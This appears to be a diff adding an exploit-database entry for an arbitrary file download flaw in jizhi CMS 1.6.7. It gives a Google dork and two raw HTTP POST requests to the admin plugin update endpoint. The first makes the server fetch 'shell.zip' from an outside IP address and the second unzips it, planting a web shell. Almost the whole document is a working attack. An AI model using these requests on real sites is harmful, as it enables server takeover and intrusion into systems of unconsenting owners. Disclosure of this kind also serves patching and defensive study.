@@ -1,0 +1,46 @@
+# Exploit Title: jizhi CMS 1.6.7 - Arbitrary File Download
+# Google Dork: jizhicms
+# Date: 2020-04-18
+# Exploit Author: iej1ctk1g
+# Vendor Homepage: https://www.jizhicms.cn/
+# Software Link: http://down.jizhicms.cn/jizhicms_Beta1.6.7.zip
+# Version: 1.6.7
+# Tested on： Mac OS
+# CVE : N/A
+
+Data 1.
+
+POST /admin.php/Plugins/update.html HTTP/1.1
+Host: 192.168.1.253:8888
+Content-Length: 86
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.1.253:8888
+Referer: http://192.168.1.253:8888/admin.php/Plugins/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: PHPSESSID=32db2410f5d69bf21ba9b21ab8093a09
+Connection: close
+
+action=start-download&filepath=shell&download_url=http://39.105.143.130:9090/shell.zip
+
+
+Data 2.
+
+POST /admin.php/Plugins/update.html HTTP/1.1
+Host: 192.168.1.253:8888
+Content-Length: 32
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.1.253:8888
+Referer: http://192.168.1.253:8888/admin.php/Plugins/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: PHPSESSID=32db2410f5d69bf21ba9b21ab8093a09
+Connection: close
+
+action=file-upzip&filepath=shell
